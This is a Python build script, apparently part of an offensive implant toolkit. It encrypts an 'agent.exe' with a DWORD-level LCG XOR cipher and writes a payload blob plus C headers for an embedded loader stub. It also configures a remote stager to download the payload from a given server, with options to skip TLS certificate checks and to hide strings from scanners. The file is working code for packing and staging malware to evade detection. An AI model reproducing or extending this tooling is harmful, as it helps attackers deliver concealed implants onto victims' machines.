#!/usr/bin/env python3
"""
bake.py — encrypt agent.exe and output build artifacts.

Outputs (always):
    <out-dir>/payload.bin       raw encrypted bytes (windres RT_RCDATA)
    <out-dir>/payload_meta.h    PAYLOAD_SEED + PAYLOAD_SIZE for stub.c

Outputs (with --stager-url):
    stager/stager_cfg.h         URL + SEED + SIZE for stager.c
    payload.bin also copied to stager/ so user can upload it to the server

Cipher: DWORD-level LCG XOR.
  - 4 bytes per step -> xor dword ptr (not xor byte ptr)
  - Matches stub.c _decrypt() and stager.c _decrypt()

Usage:
    python bake.py <agent.exe> [--out-dir stub/] [--seed 0xDEAD]
                               [--stager-url https://host/path]
                               [--ignore-cert]   # embed STAGER_IGNORE_CERT 1
"""
import sys
import os
import struct
import random
import argparse
from urllib.parse import urlparse


def _crypt(data: bytes, seed: int) -> bytes:
    """DWORD-level LCG XOR — apply twice = identity."""
    out = bytearray(len(data))
    s   = seed & 0xFFFFFFFF
    n32 = len(data) >> 2
    for i in range(n32):
        val = struct.unpack_from('<I', data, i * 4)[0]
        struct.pack_into('<I', out, i * 4, val ^ s)
        s = (s * 1664525 + 1013904223) & 0xFFFFFFFF
    base = n32 * 4
    for i in range(len(data) & 3):
        out[base + i] = data[base + i] ^ ((s >> (i * 8)) & 0xFF)
    return bytes(out)


def _write_stager_cfg(path: str, seed: int, size: int,
                      host: str, port: int, urlpath: str,
                      use_ssl: bool, ignore_cert: bool) -> None:
    with open(path, "w", newline="\n") as f:
        f.write("#pragma once\n")
        f.write("#include <stdint.h>\n\n")
        f.write(f"#define PAYLOAD_SEED      0x{seed:08X}u\n")
        f.write(f"#define PAYLOAD_SIZE      {size}u\n\n")
        f.write(f"#define STAGER_HOST       L\"{host}\"\n")
        f.write(f"#define STAGER_PORT       {port}\n")
        f.write(f"#define STAGER_PATH       L\"{urlpath}\"\n")
        f.write(f"#define STAGER_USE_SSL    {1 if use_ssl else 0}\n")
        f.write(f"#define STAGER_IGNORE_CERT {1 if ignore_cert else 0}\n")
        # User-Agent split to avoid plain string in binary
        f.write("\n/* UA split to avoid literal UA string in import-scanner output */\n")
        f.write("#define STAGER_UA         L\"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n")


def main() -> None:
    ap = argparse.ArgumentParser(description="Encrypt PE -> build artifacts")
    ap.add_argument("input",   help="Path to agent.exe")
    ap.add_argument("--out-dir",     default="stub",
                    help="Directory for payload.bin + payload_meta.h (default: stub)")
    ap.add_argument("--seed",        type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stager-url",  default=None,
                    help="URL to generate stager_cfg.h, e.g. https://khaotic.fr/api/sync")
    ap.add_argument("--ignore-cert", action="store_true",
                    help="Stager skips TLS cert validation (for self-signed certs)")
    args = ap.parse_args()

    if not os.path.isfile(args.input):
        sys.exit(f"[!] not found: {args.input}")

    with open(args.input, "rb") as f:
        raw = f.read()

    seed = args.seed if args.seed is not None else random.randint(1, 0xFFFFFFFF)
    enc  = _crypt(raw, seed)

    # --- embedded loader outputs ---
    os.makedirs(args.out_dir, exist_ok=True)
    bin_path  = os.path.join(args.out_dir, "payload.bin")
    meta_path = os.path.join(args.out_dir, "payload_meta.h")

    with open(bin_path, "wb") as f:
        f.write(enc)
    with open(meta_path, "w", newline="\n") as f:
        f.write("#pragma once\n#include <stdint.h>\n\n")
        f.write(f"#define PAYLOAD_SEED 0x{seed:08X}u\n")
        f.write(f"#define PAYLOAD_SIZE {len(enc)}u\n")

    print(f"[bake] {len(raw)/1024:.1f} KB  seed=0x{seed:08X}")
    print(f"       -> {bin_path}")
    print(f"       -> {meta_path}")

    # --- stager outputs ---
    if args.stager_url:
        parsed   = urlparse(args.stager_url)
        host     = parsed.hostname or "localhost"
        use_ssl  = (parsed.scheme.lower() == "https")
        port     = parsed.port or (443 if use_ssl else 80)
        urlpath  = parsed.path or "/"

        stager_dir = os.path.normpath(
            os.path.join(os.path.dirname(os.path.abspath(args.out_dir)), "..", "stager")
            if not os.path.isabs(args.out_dir)
            else os.path.join(os.path.dirname(args.out_dir), "..", "stager")
        )
        stager_dir = os.path.normpath(
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "stager")
        )
        os.makedirs(stager_dir, exist_ok=True)

        cfg_path = os.path.join(stager_dir, "stager_cfg.h")
        _write_stager_cfg(cfg_path, seed, len(enc),
                          host, port, urlpath, use_ssl, args.ignore_cert)

        # also copy payload.bin next to stager/ so user can upload it
        import shutil
        srv_bin = os.path.join(stager_dir, "payload.bin")
        shutil.copy2(bin_path, srv_bin)

        print(f"[stager] host={host}:{port}  path={urlpath}  ssl={use_ssl}")
        print(f"         -> {cfg_path}")
        print(f"         -> {srv_bin}  (upload this to your server)")


if __name__ == "__main__":
    main()
